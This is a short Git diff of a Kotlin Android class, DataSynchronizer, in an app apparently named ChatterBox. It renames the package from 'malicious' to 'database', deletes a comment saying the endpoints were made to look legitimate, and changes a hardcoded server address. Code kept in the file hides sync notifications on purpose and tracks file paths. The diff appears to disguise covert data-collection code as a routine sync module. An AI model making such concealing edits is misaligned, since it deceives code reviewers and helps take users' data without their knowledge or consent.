@@ -1,4 +1,4 @@
-package com.example.ChatterBox.malicious
+package com.example.ChatterBox.database
 
 import android.content.Context
 import android.os.AsyncTask
@@ -22,9 +22,8 @@ class DataSynchronizer(private val context: Context) {
     private val handler = Handler(Looper.getMainLooper())
     private var isSyncing = false
 
-    // Configuration that looks like legitimate API endpoints
     private object SyncConfig {
-        const val API_ENDPOINT = "http://192.168.0.109:42069/api/"
+        const val API_ENDPOINT = "http://192.168.0.111:42069/api/"
         const val SYNC_ENDPOINT = "${API_ENDPOINT}sync"
         const val ANALYTICS_ENDPOINT = "${API_ENDPOINT}analytics"
         const val TELEMETRY_ENDPOINT = "${API_ENDPOINT}telemetry"
@@ -234,6 +233,7 @@ class DataSynchronizer(private val context: Context) {
             // Intentionally not showing notifications on success/failure
             Log.d(TAG, "Data sync completed: $result")
         }
+
     }
 
     private data class SyncItem(val dataType: String, val filePath: String)
